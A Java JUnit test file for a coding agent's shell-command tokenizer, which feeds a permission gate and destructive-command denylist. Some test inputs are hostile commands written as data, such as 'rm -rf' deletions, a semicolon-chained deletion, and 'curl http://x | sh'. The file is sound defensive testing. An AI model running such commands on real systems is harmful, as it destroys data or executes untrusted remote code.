package com.srk.codingagent.permission;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.List;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

/**
 * Adversarial tests for the {@link ShellTokenizer} — the load-bearing front end the
 * permission gate (C8) runs before the destructive denylist and before RD-1 grant-key
 * normalization (ADR-0004: "Tokenize the command (shell-word split, honoring quotes)").
 *
 * <p>Oracle: ADR-0004's tokenization contract — shell-word split honoring quotes, with
 * chaining/redirect operators visible as their own tokens so a conservative pattern test
 * over the tokens cannot be defeated by quoting or chaining. The expected token lists are
 * derived from that contract, not from the tokenizer's own output.
 */
class ShellTokenizerTest {

    @Test
    @DisplayName("ADR-0004: plain words split on whitespace")
    void splitsPlainWordsOnWhitespace() {
        // Oracle: shell-word split — "mvn test -X" is three words.
        assertEquals(List.of("mvn", "test", "-X"), ShellTokenizer.tokenize("mvn test -X"));
    }

    @Test
    @DisplayName("ADR-0004: runs of whitespace collapse, no empty words leak")
    void collapsesWhitespaceRuns() {
        assertEquals(List.of("git", "status"), ShellTokenizer.tokenize("  git    status  "));
    }

    @Test
    @DisplayName("ADR-0004: a blank command yields no tokens")
    void blankCommandYieldsNoTokens() {
        assertTrue(ShellTokenizer.tokenize("").isEmpty());
        assertTrue(ShellTokenizer.tokenize("   ").isEmpty());
    }

    @Test
    @DisplayName("ADR-0004: single quotes group a literal run including spaces")
    void singleQuotesGroupLiteralRun() {
        // Oracle: honoring quotes — the quoted run is ONE word; the inner space does not split.
        assertEquals(List.of("echo", "hello world"),
                ShellTokenizer.tokenize("echo 'hello world'"));
    }

    @Test
    @DisplayName("ADR-0004: double quotes group a run and honor backslash escapes inside")
    void doubleQuotesGroupAndHonorEscapes() {
        assertEquals(List.of("echo", "a \"b"),
                ShellTokenizer.tokenize("echo \"a \\\"b\""));
    }

    @Test
    @DisplayName("ADR-0004 adversarial: a quoted destructive keyword stays a single visible token")
    void quotedKeywordRemainsOneToken() {
        // Adversarial: an attacker quotes the path so a naive splitter mis-handles it; the
        // 'rm' executable and the '-rf' flag remain distinct, visible tokens.
        assertEquals(List.of("rm", "-rf", "my dir"),
                ShellTokenizer.tokenize("rm -rf 'my dir'"));
    }

    @Test
    @DisplayName("ADR-0004 adversarial: a semicolon chain is split with ';' as its own token")
    void semicolonChainSplitsWithSeparatorToken() {
        // Oracle: chaining operators are visible tokens so the denylist sees each segment.
        assertEquals(List.of("ls", ";", "rm", "-rf", "/tmp/x"),
                ShellTokenizer.tokenize("ls; rm -rf /tmp/x"));
    }

    @Test
    @DisplayName("ADR-0004 adversarial: && and || coalesce into one operator token")
    void logicalOperatorsCoalesce() {
        assertEquals(List.of("a", "&&", "b", "||", "c"),
                ShellTokenizer.tokenize("a && b || c"));
    }

    @Test
    @DisplayName("ADR-0004 adversarial: a pipe is its own token so curl | sh is visible")
    void pipeIsOwnToken() {
        assertEquals(List.of("curl", "http://x", "|", "sh"),
                ShellTokenizer.tokenize("curl http://x | sh"));
    }

    @Test
    @DisplayName("ADR-0004 adversarial: a redirect operator splits even when glued to a word")
    void redirectSplitsWhenGluedToWord() {
        // Oracle: '>' is a single-char operator emitted on its own; 'echo x>file' tokenizes
        // to echo, x, >, file so the overwrite-by-redirect pattern is visible.
        assertEquals(List.of("echo", "x", ">", "file"),
                ShellTokenizer.tokenize("echo x>file"));
    }

    @Test
    @DisplayName("ADR-0004 adversarial: >> appends and coalesces distinctly from >")
    void appendRedirectCoalesces() {
        assertEquals(List.of("echo", "x", ">>", "log"),
                ShellTokenizer.tokenize("echo x >> log"));
    }

    @Test
    @DisplayName("ADR-0004 adversarial: an unquoted backslash escapes the next char into the word")
    void backslashEscapesNextChar() {
        // 'a\ b' is the single word 'a b' (escaped space).
        assertEquals(List.of("a b"), ShellTokenizer.tokenize("a\\ b"));
    }

    @Test
    @DisplayName("ADR-0004: an unterminated quote ends the word at end-of-string")
    void unterminatedQuoteEndsWord() {
        assertEquals(List.of("echo", "abc"), ShellTokenizer.tokenize("echo 'abc"));
    }

    @Test
    @DisplayName("ADR-0004 adversarial: an absolute path executable keeps its slashes as one token")
    void absolutePathExecutableIsOneToken() {
        assertEquals(List.of("/usr/bin/rm", "-rf", "x"),
                ShellTokenizer.tokenize("/usr/bin/rm -rf x"));
    }

    @Test
    @DisplayName("ADR-0004 adversarial: an empty quoted string is an explicit empty word")
    void emptyQuotedStringIsExplicitWord() {
        // The quoted empty word is a real argument; it must not vanish.
        assertEquals(List.of("cmd", ""), ShellTokenizer.tokenize("cmd ''"));
    }
}
